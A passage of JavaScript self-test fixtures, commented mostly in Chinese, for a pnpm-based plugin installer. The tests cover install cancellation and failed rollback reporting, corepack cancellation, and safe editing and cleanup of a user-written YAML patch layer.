  // 4b-2. 取消了，但回滚做不成。marker 被外部删掉（外部清理、磁盘故障、
  // 或本轮压根没登记上），rollbackPendingSnapshot 返回 undefined 而不抛。
  //
  // 这是最不能撒谎的一格：profile 停在 pnpm 动过一半的状态，没有还原目标，
  // 而用户看到的如果是「killed，已还原」，他就不会去查——正是他必须去查的
  // 那一次。所以结局必须退回 failed，并且指名 marker 和排查手段。
  {
    const { profileDir, cleanup } = makeTempProfile("cancel-rollback-fails");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn } = blockingSpawn("win32");
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      rmSync(pendingMarkerPath(profileDir), { force: true }); // 抽掉还原目标
      install.cancel();
      const outcome = await install.done;
      const detail = outcome.detail ?? "";
      check(
        "取消 + 回滚失败（install）→ 退回 failed，不报 killed",
        outcome.status === "failed",
        `status=${outcome.status} detail=${detail}`,
      );
      check(
        "取消 + 回滚失败（install）→ 绝不声称已还原",
        !/was restored/.test(detail),
        `detail=${detail}`,
      );
      check(
        "取消 + 回滚失败（install）→ 指名 marker 与排查手段",
        /marker/.test(detail) && /guard validate|guard recover|before the next start/.test(detail),
        `detail=${detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 4b-3. pnpm 缺失 → corepack 自愈期间取消。此前 current 还指着那个 ENOENT
  // 失败的 pnpm，cancel() 什么也杀不到，corepack 跑完还会照常开装——按了
  // job_kill 之后仍然会改 profile。retry 的 spawn 次数必须是 0。
  {
    const { profileDir, cleanup } = makeTempProfile("corepack-cancel");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      let spawnCount = 0;
      const spawnFn = () => {
        spawnCount++;
        const proc = new FakeProc("win32");
        queueMicrotask(() => proc.emit("error", Object.assign(new Error("spawn pnpm ENOENT"), { code: "ENOENT" })));
        return proc;
      };
      let releaseCorepack;
      const corepackRunning = new Promise((resolveGate) => { releaseCorepack = resolveGate; });
      // corepack 的子进程必须真的被 cancel() 够到，而不只是「之后不再 spawn」。
      // 交出去的句柄没人杀的话，corepack 会在后台把 pnpm 装完，用户按的那次
      // 取消就只挡住了后半程。
      let corepackKilled = false;
      const install = runInstall({
        profile: "p",
        spec: "pkg-a",
        preflight: preflightStub("pkg-a"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _corepack: async (_push, onProc) => {
          onProc?.({ proc: { pid: 999, kill: () => { corepackKilled = true; } }, treeKill: false });
          await corepackRunning;
          return true; // 自愈"成功"——取消也必须挡住它后面的安装
        },
      });
      await flush();
      const spawnsBeforeCancel = spawnCount;
      install.cancel(); // corepack 还在跑
      releaseCorepack(); // 然后它成功返回——这一步之后绝不能再开装
      const outcome = await install.done;
      check(
        "corepack 自愈期间取消 → retry spawn 次数为 0",
        spawnCount === spawnsBeforeCancel && spawnCount === 1,
        `spawnCount=${spawnCount} beforeCancel=${spawnsBeforeCancel}`,
      );
      check(
        "corepack 自愈期间取消 → corepack 子进程确实收到 kill",
        corepackKilled === true,
        `corepackKilled=${corepackKilled}`,
      );
      check(
        "corepack 自愈期间取消 → 结局是 killed",
        outcome.status === "killed",
        `status=${outcome.status} detail=${outcome.detail}`,
      );
    } finally {
      cleanup();
    }
  }

  return failed;
}

/**
 * The patch-layer edit behind enable/disable. Text surgery on a file users
 * hand-write, so every shape it can meet is pinned here.
 */
function runToggleFixtures() {
  let failed = 0;
  const check = (label, ok, extra = "") => {
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${label}${ok ? "" : `  ${extra}`}`);
  };
  // 真实环境里 patch 层默认就是这个样子——注释 + 空数组。插件由 bundle 层
  // 挂载，用户文件里一条都没有。第一版只测了「行已存在」的情形，于是停用
  // 被静默跳过、重启后插件又回来了。这组用例先钉死这个场景。
  const stockTemplate = "# Your patch layer for this dsh profile\n[]\n";
  const fresh = setPatchRowDisabled(stockTemplate, "at-file", true, "dsh-at-file");
  check("空 patch 层（模板 []）→ 追加 id 定向覆盖行", /- id: at-file/.test(fresh ?? "") && /disabled: true/.test(fresh ?? ""), JSON.stringify(fresh));
  check("空 patch 层：替换掉 [] 而不是留着", !/\[\]/.test(fresh ?? ""), JSON.stringify(fresh));
  check("空 patch 层：保留原有注释", (fresh ?? "").includes("# Your patch layer"));
  check("新建行带 name 便于 dsh 校验陈旧 patch", /name: 'dsh-at-file'/.test(fresh ?? ""));
  check("空 patch 层 + 要启用 → 不改动", setPatchRowDisabled(stockTemplate, "at-file", false, "dsh-at-file") === undefined);
  check("新建的行能被 YAML 解析且是数组", (() => {
    try { return Array.isArray(load(fresh)); } catch { return false; }
  })());
  check("新建行的语义正确（id + disabled）", (() => {
    try { const doc = load(fresh); return doc[0].id === "at-file" && doc[0].disabled === true; } catch { return false; }
  })());

  const base = "- id: at-file\n  name: dsh-at-file\n";

  const off = setPatchRowDisabled(base, "at-file", true);
  check("无 disabled 行 → 插入 disabled: true", /^\s{2}disabled: true$/m.test(off ?? ""), JSON.stringify(off));
  check("插入后其余字节不变", (off ?? "").includes("name: dsh-at-file"));

  const on = setPatchRowDisabled(`- id: at-file\n  name: dsh-at-file\n  disabled: true\n`, "at-file", false);
  check("已停用 → 改回 false", /disabled: false/.test(on ?? ""), JSON.stringify(on));

  check("已是目标状态 → 不改动", setPatchRowDisabled(`- id: at-file\n  disabled: true\n`, "at-file", true) === undefined);
  check("本就启用且要启用 → 不改动", setPatchRowDisabled(base, "at-file", false) === undefined);
  check("条目不在 patch 层 → 追加新行，原有条目不动", (() => {
    const out = setPatchRowDisabled(base, "other-id", true, "pkg-other");
    return /- id: other-id/.test(out ?? "") && (out ?? "").includes("- id: at-file");
  })());

  // 用户写的条件逻辑不能被两态开关压平——必须拒绝并让人手改。
  let threw = false;
  try { setPatchRowDisabled(`- id: at-file\n  disabled: !!js process.platform === 'win32'\n`, "at-file", false); }
  catch (error) { threw = /!!js expression/.test(error.message); }
  check("disabled 是 !!js 表达式 → 拒绝接管", threw);

  // 注释是用户手写的，一个字节都不能动。
  const commented = "# 我的覆盖\n- id: at-file   # 保留这个注释\n  name: dsh-at-file\n";
  const kept = setPatchRowDisabled(commented, "at-file", true);
  check("注释原样保留", (kept ?? "").includes("# 我的覆盖") && (kept ?? "").includes("# 保留这个注释"));

  // 多条目：只动目标那条，相邻条目不受影响。
  const multi = "- id: a\n  name: pkg-a\n- id: at-file\n  name: dsh-at-file\n- id: z\n  name: pkg-z\n  disabled: true\n";
  const one = setPatchRowDisabled(multi, "at-file", true);
  check("多条目：只动目标条目", (one ?? "").split("disabled: true").length - 1 === 2 && (one ?? "").includes("- id: z"));
  check("多条目：不误伤相邻条目的 disabled", setPatchRowDisabled(multi, "a", true)?.includes("- id: z\n  name: pkg-z\n  disabled: true") === true);

  check("带引号的 id 也能匹配", setPatchRowDisabled(`- id: '@scope/pkg'\n  name: x\n`, "@scope/pkg", true) !== undefined);

  // ── 卸载时清理启用/停用覆盖行 ─────────────────────────────────────────────
  //
  // 这些行是 v0.3.0 的 toggle 功能引入的，而卸载的 patch 清理写于 v0.1.17，
  // 只认 insert 行。于是「停用过再卸载」会留下一条指向不存在条目的覆盖行：
  // 每次启动一条 `patch: entry "x" not found`，更要紧的是**重装时它会复活**，
  // 插件带着停用状态回来、界面显示已装却不工作。
  //
  // 这组用例的重点全在「什么不许删」：patch 层是用户手写的文件，删错的代价
  // 是无声丢配置，而留着的代价只是一行警告。
  const toggleCleanup = (content, packageName = "dsh-at-file") => {
    const dir = mkdtempSync(join(tmpdir(), "dsh-mall-toggle-clean-"));
    try {
      writeFileSync(join(dir, PROFILE_PATCH_FILENAME), content);
      const result = removeToggleRows(dir, packageName);
      return { result, text: readFileSync(join(dir, PROFILE_PATCH_FILENAME), "utf8") };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  const ourShape = "- id: at-file\n  name: 'dsh-at-file'\n  disabled: false\n";
  const cleaned = toggleCleanup(ourShape);
  check("我们写的形状 → 删掉，文件回到空列表",
    cleaned.result.removed.join(",") === "at-file" && cleaned.text.trim() === "[]",
    JSON.stringify(cleaned.text));

  // 删空一个**带头部注释**的文件时，剩下的只有注释——那解析成 null 而不是
  // []，dsh 的 parsePatchList 会直接拒绝启动。真实 profile 的模板恰恰带着
  // 这段注释，所以这是必经路径，不是边角。
  const stockShaped = "# Your patch layer for this dsh profile\n# 第二行注释\n- id: at-file\n  name: 'dsh-at-file'\n  disabled: false\n";
  const stockCleaned = toggleCleanup(stockShaped);
  check("删光带注释文件的最后一行 → 补回 []，保持 dsh 能解析的形状",
    Array.isArray(load(stockCleaned.text))
      && stockCleaned.text.includes("# Your patch layer")
      && stockCleaned.text.includes("[]"),
    JSON.stringify(stockCleaned.text));

  const jsExpr = "- id: at-file\n  name: 'dsh-at-file'\n  disabled: !!js process.platform === 'win32'\n";
  check("disabled 是 !!js 表达式 → 留着（那是用户写的条件逻辑）",
    toggleCleanup(jsExpr).text === jsExpr);

  const withConfig = "- id: at-file\n  name: 'dsh-at-file'\n  disabled: false\n  config:\n    foo: 1\n";
  check("行里还带 config: → 留着（不只是个开关）",
    toggleCleanup(withConfig).text === withConfig);

  const noNameGuard = "- id: at-file\n  disabled: false\n";
  check("没有 name 守卫的行 → 留着（无法确认属于这个包）",
    toggleCleanup(noNameGuard).text === noNameGuard);

  const otherPkg = "- id: sidebar\n  name: 'dsh-better-sidebar'\n  disabled: true\n";
  check("别的包的行 → 一个字节不动",
    toggleCleanup(otherPkg).text === otherPkg && toggleCleanup(otherPkg).result.removed.length === 0);

  // 一个包可以插入多行（loaderEntriesByPackage 就是为此存在的），要全删。
  const multiRow = "- id: a1\n  name: 'dsh-at-file'\n  disabled: true\n- id: keep\n  name: 'other'\n  disabled: true\n- id: a2\n  name: 'dsh-at-file'\n  disabled: false\n";
  const multiCleaned = toggleCleanup(multiRow);
  check("同一个包的多条行 → 全部删除，且顺序保持",
    multiCleaned.result.removed.join(",") === "a1,a2" && multiCleaned.text.includes("- id: keep"),
    JSON.stringify(multiCleaned.text));
  check("多行清理后不误伤相邻条目",
    multiCleaned.text.includes("name: 'other'") && !multiCleaned.text.includes("dsh-at-file"));

  const broken = "- id: at-file\n  name: 'dsh-at-file'\n disabled: [oops\n";
  check("文件解析不过 → 整个不碰",
    toggleCleanup(broken).text === broken);

  const commentedRow = "# 我手写的说明\n- id: at-file\n  name: 'dsh-at-file'\n  disabled: false\n# 尾部注释\n";
  const commentCleaned = toggleCleanup(commentedRow);
  check("删除目标行时保留周围注释",
    commentCleaned.text.includes("# 我手写的说明") && commentCleaned.text.includes("# 尾部注释")
      && !commentCleaned.text.includes("dsh-at-file"),
    JSON.stringify(commentCleaned.text));

  check("patch 文件不存在 → 安静返回，不创建文件", (() => {
    const dir = mkdtempSync(join(tmpdir(), "dsh-mall-toggle-none-"));
    try {
      const result = removeToggleRows(dir, "dsh-at-file");
      return result.removed.length === 0 && !existsSync(join(dir, PROFILE_PATCH_FILENAME));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  })());

  return failed;
}

if (process.argv[1]?.endsWith("installer.js") && process.argv.includes("--self-test")) {
  console.log("启用/停用 patch 层 fixtures:");
  const toggleFailed = runToggleFixtures();
  console.log();
  console.log("allowBuilds 合并 fixtures:");
  const failed = runAllowBuildsFixtures() + toggleFailed;
  console.log(`${ALLOW_BUILDS_FIXTURES.length - failed}/${ALLOW_BUILDS_FIXTURES.length} passed`);
  // 实装 pnpm add 的参数/环境（纯函数）：peer 自动安装必须关闭，否则
  // marketplace 安装会把 @deepseek-ai 宿主依赖栈拉进 profile；构建脚本必须
  // 严格，否则 pnpm 退出码 0 却跳过构建脚本，批准闸形同虚设。
  const addArgs = liveAddArgs("some-plugin@1.0.0");
  const argsOk = addArgs[0] === "add" && addArgs[1] === "some-plugin@1.0.0"
    && addArgs.includes("--config.auto-install-peers=false")
    && addArgs.includes("--config.strict-dep-builds=true");
  const env = liveAddEnv({ KEEP_ME: "1" });
  const envOk = env.KEEP_ME === "1"
    && env.npm_config_auto_install_peers === "false" && env.NPM_CONFIG_AUTO_INSTALL_PEERS === "false"
    && env.npm_config_strict_dep_builds === "true" && env.NPM_CONFIG_STRICT_DEP_BUILDS === "true";
  console.log(`  ${argsOk && envOk ? "PASS" : "FAIL"} 实装 pnpm add：peer 自动安装关闭 + 严格构建脚本（args + env）`);
  console.log("事务 fixtures:");
  // 默认失败：若事件循环提前排空（Promise 不挂住进程），静默退出也算 FAIL。
  process.exitCode = 1;
  void runTransactionFixtures().then(
    (txFailed) => {
      process.exit(failed === 0 && argsOk && envOk && txFailed === 0 ? 0 : 1);
    },
    (error) => {
      console.error(`  FAIL 事务 fixtures 抛错: ${error?.stack ?? error}`);
      process.exit(1);
    },
  );
}
